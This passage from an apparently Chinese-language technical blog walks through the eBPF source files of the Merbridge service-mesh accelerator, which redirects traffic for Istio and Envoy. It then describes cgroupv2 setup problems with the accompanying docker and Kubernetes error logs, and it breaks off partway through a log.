class="comment">//1.2.uid不是1337且应用没有调用本地</span></span><br><span class="line">        debugf(<span class="string">"call from user container: ip: 0x%x, port: %d"</span>, ctx-&gt;user_ip4,</span><br><span class="line">               bpf_htons(ctx-&gt;user_port));</span><br><span class="line">        <span class="comment">//需要重定向到envoy处理</span></span><br><span class="line">        __u64 cookie = bpf_get_socket_cookie_addr(ctx); <span class="comment">//获取当前netns的cookie</span></span><br><span class="line">        <span class="comment">//定义原始目的地址信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> <span class="title">origin</span> = &#123;</span></span><br><span class="line">            .ip = ctx-&gt;user_ip4,</span><br><span class="line">            .port = ctx-&gt;user_port,</span><br><span class="line">            .pid = pid,</span><br><span class="line">            .flags = <span class="number">1</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将cookie和源地址信息更新到cookie_original_dst中，更新成功返回0，失败返回负值</span></span><br><span class="line">        <span class="keyword">if</span> (bpf_map_update_elem(&amp;cookie_original_dst, &amp;cookie, &amp;origin,</span><br><span class="line">                                BPF_ANY)) &#123;</span><br><span class="line">            printk(<span class="string">"write cookie_original_dst failed"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//应用向外发起连接时，将目标地址修改为 127.x.y.z:15001</span></span><br><span class="line">        <span class="comment">//之所以在connect时，修改目的地址为127.x.y.z而不是127.0.0.1</span></span><br><span class="line">        <span class="comment">//是因为在不同的Pod中，可能产生冲突的四元组，使用此方式即可巧妙地避开冲突</span></span><br><span class="line">        ctx-&gt;user_ip4 = bpf_htonl(<span class="number">0x7f800000</span> | (outip++));</span><br><span class="line">        <span class="keyword">if</span> (outip &gt;&gt; <span class="number">20</span>) &#123;</span><br><span class="line">            outip = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx-&gt;user_port = bpf_htons(OUT_REDIRECT_PORT);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//uid=1337</span></span><br><span class="line">        <span class="comment">//2.从envoy到其他的情况</span></span><br><span class="line">        debugf(<span class="string">"call from sidecar container: ip: 0x%x, port: %d"</span>, ctx-&gt;user_ip4,</span><br><span class="line">               bpf_htons(ctx-&gt;user_port));</span><br><span class="line">        __u32 ip = ctx-&gt;user_ip4;</span><br><span class="line">        <span class="keyword">if</span> (!bpf_map_lookup_elem(&amp;local_pod_ips, &amp;ip)) &#123;</span><br><span class="line">            <span class="comment">//2.1.目的ip没有在节点中，绕过</span></span><br><span class="line">            debugf(<span class="string">"dest ip: 0x%x not in this node, bypass"</span>, ctx-&gt;user_ip4);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.2.目的地址在当前节点，但是不在当前pod</span></span><br><span class="line">        __u64 cookie = bpf_get_socket_cookie_addr(ctx); <span class="comment">//获取当前netns的cookie</span></span><br><span class="line">        <span class="comment">//定义原始目的地址信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> <span class="title">origin</span> = &#123;</span></span><br><span class="line">            .ip = ctx-&gt;user_ip4,</span><br><span class="line">            .port = ctx-&gt;user_port,</span><br><span class="line">            .pid = pid,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//在process_ip中查找pid信息，process_ip中存储envoy的ip地址</span></span><br><span class="line">        <span class="keyword">void</span> *curr_ip = bpf_map_lookup_elem(&amp;process_ip, &amp;pid);</span><br><span class="line">        <span class="comment">//2.2.1如果存在则属于envoy到其他envoy</span></span><br><span class="line">        <span class="keyword">if</span> (curr_ip) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*(__u32 *)curr_ip != ctx-&gt;user_ip4) &#123;</span><br><span class="line">                debugf(<span class="string">"enovy to other, rewrite dst port from %d to %d"</span>,</span><br><span class="line">                       ctx-&gt;user_port, IN_REDIRECT_PORT);</span><br><span class="line">                ctx-&gt;user_port = bpf_htons(IN_REDIRECT_PORT);</span><br><span class="line">            &#125;</span><br><span class="line">            origin.flags |= <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 2.2.2.envoy到应用程序，不用重写</span></span><br><span class="line">            origin.flags = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_RECONNECT</span></span><br><span class="line">            <span class="comment">// envoy to envoy</span></span><br><span class="line">            <span class="comment">// try redirect to 15006</span></span><br><span class="line">            <span class="comment">// but it may cause error if it is envoy call self pod,</span></span><br><span class="line">            <span class="comment">// in this case, we can read src and dst ip in sockops,</span></span><br><span class="line">            <span class="comment">// if src is equals dst, it means envoy call self pod,</span></span><br><span class="line">            <span class="comment">// we should reject this traffic in sockops,</span></span><br><span class="line">            <span class="comment">// envoy will create a new connection to self pod.</span></span><br><span class="line">            ctx-&gt;user_port = bpf_htons(IN_REDIRECT_PORT);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bpf_map_update_elem(&amp;cookie_original_dst, &amp;cookie, &amp;origin,</span><br><span class="line">                                BPF_NOEXIST)) &#123;</span><br><span class="line">            printk(<span class="string">"update cookie origin failed"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h5 id="mb-get-sockopts-c"><a href="#mb-get-sockopts-c" class="headerlink" title="mb_get_sockopts.c"></a><code>mb_get_sockopts.c</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_OPS_BUFF_LENGTH 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SO_ORIGINAL_DST 80 <span class="comment">//80是ORIGINAL_DST在内核中的编号</span></span></span><br><span class="line"></span><br><span class="line">__section(<span class="string">"cgroup/getsockopt"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_get_sockopt</span><span class="params">(struct bpf_sockopt *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//ebpf无法处理大于4096字节的数据</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;optlen &gt; MAX_OPS_BUFF_LENGTH) &#123;</span><br><span class="line">        debugf(<span class="string">"optname: %d, force set optlen to %d, original optlen %d is too "</span></span><br><span class="line">               <span class="string">"high"</span>,</span><br><span class="line">               ctx-&gt;optname, MAX_OPS_BUFF_LENGTH, ctx-&gt;optlen);</span><br><span class="line">        ctx-&gt;optlen = MAX_OPS_BUFF_LENGTH;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//代理把TCP连接拦截下来之后，并不知道原来的目标地址是什么，从而无法实现转发</span></span><br><span class="line">    <span class="comment">//Envoy收到连接之后会调用getsockopt获取原始目的信息</span></span><br><span class="line">    <span class="comment">//get_sockopts程序会根据四元组信息从pair_original_dst取出原始目的地址并返回给Envoy，由此连接完全建立</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;optname == SO_ORIGINAL_DST) &#123;</span><br><span class="line">        <span class="comment">//定义四元组结构体信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pair</span> <span class="title">p</span> = &#123;</span></span><br><span class="line">            .dip = ctx-&gt;sk-&gt;src_ip4,</span><br><span class="line">            .dport = bpf_htons(ctx-&gt;sk-&gt;src_port),</span><br><span class="line">            .sip = ctx-&gt;sk-&gt;dst_ip4,</span><br><span class="line">            .sport = bpf_htons(ctx-&gt;sk-&gt;dst_port),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//根据四元组信息从pair_original_dst取出原始目的地址并返回</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> *<span class="title">origin</span> =</span></span><br><span class="line"><span class="class">            <span class="title">bpf_map_lookup_elem</span>(&amp;<span class="title">pair_original_dst</span>, &amp;<span class="title">p</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (origin) &#123; <span class="comment">// 重写原始目的地址</span></span><br><span class="line">            ctx-&gt;optlen = (__s32)<span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">            <span class="comment">//边界检查</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">void</span> *)((struct sockaddr_in *)ctx-&gt;optval + <span class="number">1</span>) &gt;</span><br><span class="line">                ctx-&gt;optval_end) &#123;</span><br><span class="line">                printk(<span class="string">"optname: %d: invalid getsockopt optval"</span>, ctx-&gt;optname);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将系统调用返回值重置为零</span></span><br><span class="line">            ctx-&gt;retval = <span class="number">0</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span> = &#123;</span></span><br><span class="line">                .sin_family = ctx-&gt;sk-&gt;family,</span><br><span class="line">                .sin_addr.s_addr = origin-&gt;ip,</span><br><span class="line">                .sin_port = origin-&gt;port,</span><br><span class="line">            &#125;;</span><br><span class="line">            *(struct sockaddr_in *)ctx-&gt;optval = sa;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h5 id="mb-redir-c"><a href="#mb-redir-c" class="headerlink" title="mb_redir.c"></a><code>mb_redir.c</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="comment">//在socket发起 sendmsg 系统调用时触发执行</span></span><br><span class="line">__section(<span class="string">"sk_msg"</span>) </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mb_msg_redir</span><span class="params">(struct sk_msg_md *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//这里的结构体就是sock_pair_map中的key</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pair</span> <span class="title">p</span> = &#123;</span></span><br><span class="line">        .sip = msg-&gt;local_ip4,</span><br><span class="line">        .sport = msg-&gt;local_port,</span><br><span class="line">        .dip = msg-&gt;remote_ip4,</span><br><span class="line">        .dport = msg-&gt;remote_port &gt;&gt; <span class="number">16</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//根据四元组信息，从sock_pair_map中读取sock</span></span><br><span class="line">    <span class="comment">//然后通过bpf_msg_redirect_hash直接转发，加速请求</span></span><br><span class="line">    <span class="keyword">long</span> ret = bpf_msg_redirect_hash(msg, &amp;sock_pair_map, &amp;p, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret)</span><br><span class="line">        debugf(<span class="string">"redirect %d bytes with eBPF successfully"</span>, msg-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><code>bpf_msg_redirect_hash</code>参数解析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bpf_msg_redirect_hash(msg, &amp;sock_pair_map, &amp;p, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li>msg：用户可访问的待发送数据的元信息</li><li>sock_pair_map：这个BPF程序attach到的<code>sockhash map</code></li><li>p：在<code>map</code>中索引用的<code>key</code></li><li>0：<code>BPF_F_INGRESS</code>，放到对端的哪个<code>queue</code></li></ul><h5 id="mb-sockops-c"><a href="#mb-sockops-c" class="headerlink" title="mb_sockops.c"></a><code>mb_sockops.c</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/mesh.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sockops_ipv4</span><span class="params">(struct bpf_sock_ops *skops)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取当前netns的cookie</span></span><br><span class="line">    __u64 cookie = bpf_get_socket_cookie_ops(skops);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在cookie_original_dst查找与cookie相关的条目</span></span><br><span class="line">    <span class="keyword">void</span> *dst = bpf_map_lookup_elem(&amp;cookie_original_dst, &amp;cookie);</span><br><span class="line">    <span class="comment">//如果存在cookie</span></span><br><span class="line">    <span class="keyword">if</span> (dst) &#123;</span><br><span class="line">        <span class="comment">//dd保存原始目的信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> <span class="title">dd</span> = *(<span class="title">struct</span> <span class="title">origin_info</span> *)<span class="title">dst</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (!(dd.flags &amp; <span class="number">1</span>)) &#123;</span><br><span class="line">            __u32 pid = dd.pid;</span><br><span class="line">            <span class="comment">// 判断源IP和目的地址IP是否一致</span></span><br><span class="line">            <span class="keyword">if</span> (skops-&gt;local_ip4 == <span class="number">100663423</span> ||</span><br><span class="line">                skops-&gt;local_ip4 == skops-&gt;remote_ip4) &#123;</span><br><span class="line">                <span class="comment">//如果一致，代表发送了错误的请求</span></span><br><span class="line">                __u32 ip = skops-&gt;remote_ip4;</span><br><span class="line">                debugf(<span class="string">"detected process %d's ip is %d"</span>, pid, ip);</span><br><span class="line">                <span class="comment">//并将当前的ProcessID和IP信息写入process_ip这个map</span></span><br><span class="line">                bpf_map_update_elem(&amp;process_ip, &amp;pid, &amp;ip, BPF_ANY);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_RECONNECT</span></span><br><span class="line">                <span class="comment">//bpf_htons:主机序到网络序</span></span><br><span class="line">                <span class="comment">//判断远程端口是不是15006端口，如果是的话则丢弃这个连接</span></span><br><span class="line">                <span class="keyword">if</span> (skops-&gt;remote_port &gt;&gt; <span class="number">16</span> == bpf_htons(IN_REDIRECT_PORT)) &#123;</span><br><span class="line">                    printk(<span class="string">"incorrect connection: cookie=%d"</span>, cookie);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// envoy to envoy</span></span><br><span class="line">                __u32 ip = skops-&gt;local_ip4;</span><br><span class="line">                <span class="comment">//将当前的ProcessID和IP信息写入process_ip这个map</span></span><br><span class="line">                bpf_map_update_elem(&amp;process_ip, &amp;pid, &amp;ip, BPF_ANY);</span><br><span class="line">                debugf(<span class="string">"detected process %d's ip is %d"</span>, pid, ip);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// get_sockopts can read pid and cookie,</span></span><br><span class="line">        <span class="comment">// we should write a new map named pair_original_dst</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pair</span> <span class="title">p</span> = &#123;</span></span><br><span class="line">            .sip = skops-&gt;local_ip4,</span><br><span class="line">            .sport = skops-&gt;local_port,</span><br><span class="line">            .dip = skops-&gt;remote_ip4,</span><br><span class="line">            .dport = skops-&gt;remote_port &gt;&gt; <span class="number">16</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将四元组信息和对应的原始目的地址写入pair_original_dst中</span></span><br><span class="line">        bpf_map_update_elem(&amp;pair_original_dst, &amp;p, &amp;dd, BPF_NOEXIST);</span><br><span class="line">        <span class="comment">//将当前sock和四元组保存在sock_pair_map中</span></span><br><span class="line">        bpf_sock_hash_update(skops, &amp;sock_pair_map, &amp;p, BPF_NOEXIST);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听socket事件</span></span><br><span class="line">__section(<span class="string">"sockops"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_sockops</span><span class="params">(struct bpf_sock_ops *skops)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __u32 family, op;</span><br><span class="line">    family = skops-&gt;family;</span><br><span class="line">    op = skops-&gt;op;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">    <span class="comment">// case BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB://被动建连</span></span><br><span class="line">    <span class="keyword">case</span> BPF_SOCK_OPS_ACTIVE_ESTABLISHED_CB:  <span class="comment">// 主动建连</span></span><br><span class="line">        <span class="keyword">if</span> (family == <span class="number">2</span>) &#123; <span class="comment">// AFI_NET, we dont include socket.h, because it may</span></span><br><span class="line">                           <span class="comment">// cause an import error.</span></span><br><span class="line">            <span class="keyword">if</span> (sockops_ipv4(skops)) <span class="comment">//记录socket信息到sockmap</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h4 id="启用cgroupv2产生的问题"><a href="#启用cgroupv2产生的问题" class="headerlink" title="启用cgroupv2产生的问题"></a>启用cgroupv2产生的问题</h4><h5 id="如何启动cgroupv2"><a href="#如何启动cgroupv2" class="headerlink" title="如何启动cgroupv2"></a>如何启动cgroupv2</h5><p>调整<code>grub linux</code>内核引导参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>修改<code>GRUB_CMDLINE_LINUX</code>为<code>systemd.unified_cgroup_hierarchy=1</code></p><p>更新<code>grub</code>并重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>判断是否启用cgroupv2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ cat /sys/fs/cgroup/cgroup.controllers</span><br><span class="line">cpuset cpu io memory hugetlb pids rdma</span><br></pre></td></tr></table></figure><p>在没有启用<code>cgroupv2</code>时，拉取<code>merbridge</code>镜像之后，执行<code>docker run</code>指令会报如下错误</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker run -it --privileged 605389bb6641</span><br><span class="line">[ -f bpf/mb_connect.c ] &amp;&amp; make -C bpf load || make -C bpf load-from-obj</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">Makefile:29: *** It looks like your system does not have cgroupv2 enabled, or the automatic recognition fails. Please enable cgroupv2, or specify the path of cgroupv2 manually via CGROUP2_PATH parameter..  Stop.</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">Makefile:29: *** It looks like your system does not have cgroupv2 enabled, or the automatic recognition fails. Please enable cgroupv2, or specify the path of cgroupv2 manually via CGROUP2_PATH parameter..  Stop.</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make: *** [Makefile:3: load] Error 2</span><br><span class="line">panic: unexpected exit code: 2, err: exit status 2</span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">main.main()</span><br><span class="line">        /app/cmd/mbctl/main.go:68 +0x725</span><br></pre></td></tr></table></figure><p>启用<code>cgroupv2</code>之后，<code>docker run</code>执行正常，可是k8s运行yaml会失败，查看pod报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods -n istio-system</span><br><span class="line">NAME                                    READY   STATUS    RESTARTS      AGE</span><br><span class="line">istio-egressgateway-79bb75fcf9-lttmn    1/1     Running   1             3h10m</span><br><span class="line">istio-ingressgateway-84bfcfd895-p4wbx   1/1     Running   1             3h10m</span><br><span class="line">istiod-6c5cfd79db-vqvws                 1/1     Running   1             3h12m</span><br><span class="line">merbridge-9dhf2                         0/1     Error     1 (15s ago)   23s</span><br><span class="line">root@ubuntu:~# kubectl logs merbridge-9dhf2 -n istio-system</span><br><span class="line">[ -f bpf/mb_connect.c ] &amp;&amp; make -C bpf load || make -C bpf load-from-obj</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_connect.c -o mb_connect.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_get_sockopts.c -o mb_get_sockopts.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_redir.c -o mb_redir.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_sockops.c -o mb_sockops.o</span><br><span class="line">clang -O2 -g  -Wall -target bpf -I/usr/include/x86_64-linux-gnu  -DMESH=1 -DUSE_RECONNECT -c mb_bind.c -o mb_bind.o</span><br><span class="line">[ -f /sys/fs/bpf/cookie_original_dst ] || sudo bpftool map create /sys/fs/bpf/cookie_original_dst type lru_hash key 4 value 12 entries 65535 name cookie_original_dst</span><br><span class="line">[ -f /sys/fs/bpf/local_pod_ips ] || sudo bpftool map create /sys/fs/bpf/local_pod_ips type hash key 4 value 4 entries 1024 name local_pod_ips</span><br><span class="line">[ -f /sys/fs/bpf/process_ip ] || sudo bpftool map create /sys/fs/bpf/process_ip type lru_hash key 4 value 4 entries 1024 name process_ip</span><br><span class="line">sudo bpftool prog load mb_connect.o 